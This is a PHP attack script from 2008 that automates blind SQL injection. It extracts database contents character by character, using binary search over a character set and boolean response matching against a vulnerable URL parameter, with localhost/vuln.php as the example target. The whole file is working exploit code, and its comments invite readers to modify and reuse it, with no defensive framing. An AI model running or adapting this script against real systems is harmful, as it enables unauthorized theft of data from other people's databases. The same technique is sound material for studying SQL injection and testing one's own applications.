<?php


#  Name -> Blind SQL Injection by Dichotomy Function
#    Credits -> charles "real" F. <charlesfol[at]hotmail.fr>       
#  Date -> 13-04-08

/*
 * 
 *  This c0de uses the dichotomy algorithm to retrieve SQL data.
 *
 *  Dichotomy can be schematised like this:
 *
 *  1/1   [---------x----------------------]
 *  1/2   [///////////////][---------------]
 *  1/4   [-------][//////]
 *  1/8            [//][--]   
 *
 *  It permits demencial charsets use, and charset order
 *  doesn't matter.
 *
 *  The useful function is  blind(), the rest is just useful to
 *  view results easily.
 *  It's an example, you can/must modify it.
 *  
 * 
 *  Maths time:
 *  c = max queries by letter for 1-by-1 test
 *  n = max queries by letter for dichotomy algorithm
 *  c = 2^n
 * 
 *  So ... n<c.If you don't trust me ... try.
 *
 *
 */

#------------ EXAMPLE --------------------------------------------------------

$debug = true;

$url   = "http://localhost/vuln.php?id=3"; # target url
$match = "Name|Titre"; # bsqli match

# charset
$charset = 
 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
."0123456789_-'\"~#&(){}[]<>|`:/;!?";

print "\n";
print "Query:   $argv[1]\n";
print "Charset: $charset (".strlen($charset).")\n";
print "\n";
print "Result:  ";
blind("$argv[1]",$charset,32);
print "\n";

#-----------------------------------------------------------------------------

/*
 * blind() - Blind SQL Injection by Dichotomy
 *
 * @param query    the SQL query
 * @param charset  the charset you wanna use
 * @param nbchars  max number of chars
 *
 */
function blind($query,$charset,$nbchars=50)
{
	global $debug; /* debug var permit a verbose output */
	
	$result = "";
	$current_letter	= 1;
	
	/* for each letter */
	while($current_letter<=$nbchars)
	{
		$add=0;
		
		# We need a peer charset length
		$start = intval(strlen($charset)/2);
		if( ($start/2) != intval($start/2) ) $start += 1;

		# Blind SQL Injection by Dichotomy
		for($i=$start;$i>1;$i=intval($i/2+0.5))
		{
			# Put the substring on the right form.
			$sub = substr($charset,$add+$i,$i);
			$sub = preg_replace("#(.)#",",$1",$sub);
			$sub = preg_replace("#([^,])#e","ord('$1')",$sub);
			$sub = substr($sub,1);
			$sub = "(".$sub.")";
			
			$sql = "ORD(MID(($query),$current_letter,1)) IN $sub";
			
			if($debug) print "i=$i\tadd=$add\t".substr($charset,$add,$i).' | '.substr($charset,$add+$i,$i)."\n";

			if(sql_attack($sql)) $add+=$i;
		}
		
		# Bruteforce for the last 2/3 letters.
		for($k=$add;$k<=$add+2;$k++)
		{
			$letter = substr($charset,$k,1);
			$sql = "ORD(MID(($query),$current_letter,1))=".ord($letter);
			
			if($debug) print "\t\t$letter\n";
			
			if(sql_attack($sql)) break;
			$letter = '';
		}
		
		if($letter!='')
		{
			$result .= $letter;
			if($debug) print "FOUND: $letter\n\n";
			else print $letter;
		}
		else break;
		
		$current_letter++;
	}
	
	return $result;
}

#-----------------------------------------------------------------------------

# Simple attack function (returns true/false)
function sql_attack($sql)
{
	global $url,$match;
	
	$result = get($url.urlencode(' AND '.$sql));
	
	if(preg_match("#$match#i",$result)) return true;
	return false;	
}

# Simple GET function
function get($url)
{
	$result = '';
	preg_match("#^http://([^/]+)(/.*)$#i",$url,$infos);
	$host = $infos[1];
	$page = $infos[2];
	$fp = fsockopen($host, 80, &$errno, &$errstr, 30);
	
	$req  = "GET $page HTTP/1.1\r\n";
	$req .= "Host: $host\r\n";
	$req .= "User-Agent: Mozilla Firefox\r\n";
	$req .= "Connection: close\r\n\r\n";

	fputs($fp,$req);
	
	while(!feof($fp)) $result .= fgets($fp,128);
	
	fclose($fp);
	return $result;
}


?>
